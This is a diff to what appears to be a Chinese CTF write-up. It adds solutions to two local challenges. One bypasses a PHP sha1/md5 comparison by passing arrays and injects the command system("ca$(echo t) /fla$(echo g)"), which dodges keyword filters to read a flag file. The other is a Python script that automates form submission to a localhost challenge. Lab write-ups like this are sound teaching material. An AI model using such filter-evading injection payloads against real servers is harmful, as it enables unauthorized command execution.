@@ -74,18 +74,37 @@ if(isset($_GET['new'])&&isset($_POST['star'])){
     } 
 }
 ```
-```mermaid
-flowchart LR
-  A@{ shape: stadium, label: "开始" } --> B@{ shape: rounded, label: "关闭错误报告" }
-  B --> C@{ shape: diamond, label: "设置参数 new 和 star" }
-  C -->|是| D@{ shape: diamond, label: "(sha1(new) == md5(star)) && (new != star)" }
-  C -->|否| E@{ shape: stadium, label: "结束" }
-  D -->  F@{ shape: rounded, label: "$cmd" }
-  F --> G
+
+使用 `GET` 方式传入 `new[]=1`，`POST` 方式传入 `star[]=2&cmd=system("ca$(echo t) /fla$(echo g)");`
+
+![PixPin_2025-05-09_20-38-25](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-38-25.6pnq5j5elj.webp)
+
+获得 `flag`：`flag{32cba65e-2c30-0a97-726c-fc7317e00cb3}`
+
+## 你能在一秒内打出八句英文吗
+
+使用 Python 的 request 模块模拟请求
+
+```Python
+import requests
+from bs4 import BeautifulSoup
+
+start_url = "http://127.0.0.1:3307/start"
+submit_url = "http://127.0.0.1:3307/submit"
+
+session = requests.Session()
+start_response = session.get(start_url)
+
+soup = BeautifulSoup(start_response.text, "lxml")
+element = soup.find('p', {'id': 'text'})
+text = element.get_text()
+
+payload = {'user_input' : text}
+response = session.post(submit_url, data=payload)
+
+with open('response_text/你能在一秒钟打出八句英文吗.html', 'w', encoding='utf-8') as f:
+    f.write(response.text)
+
+print('Success')
 ```
-代码审计：
-- `error_reporting(0);`：关闭错误报告
-- 判断是否通过 GET 方法和 POST 方法分别传入参数 `new` 和 `star`
-  - TRUE，继续判断 `new` 的 sha1 哈希值和 `star` 的 md5 哈希值是否相等并且 `new` 和 `star` 的内容不同
-    - FALSE，输出 `Wrong`
-    - TRUE，将 POST 方法传入的参数 `cmd` 值赋给变量 `$cmd`
+
